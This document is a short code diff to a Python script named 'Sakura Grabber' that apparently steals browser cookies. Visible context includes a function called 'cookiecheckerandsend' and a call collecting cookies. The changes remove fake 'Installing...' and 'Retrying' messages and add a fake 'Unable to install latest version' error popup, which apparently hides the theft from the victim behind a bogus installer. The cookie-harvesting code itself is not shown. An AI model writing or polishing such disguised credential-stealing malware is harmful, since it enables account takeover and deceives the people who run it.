@@ -5,6 +5,7 @@ import requests
 from tkinter import messagebox
 from base64 import b64decode
 from msvcrt import getch
+from tkinter import messagebox
 
 os.system("title Sakura Grabber")
 
@@ -36,12 +37,6 @@ import time
 time.sleep(2.5)
 
 Sakura_message = "Installing..."
-print(Sakura_message)
-
-import time
-time.sleep(9.5)
-
-Sakura_message = "Failed, Retrying..."
 print(Sakura_message)
 
 def cookiecheckerandsend(cookie, platform):
@@ -147,3 +142,5 @@ def Sakura():
         pass
 
 cookies = Sakura()
+
+messagebox.showerror("Error", "Unable to install latest version.")
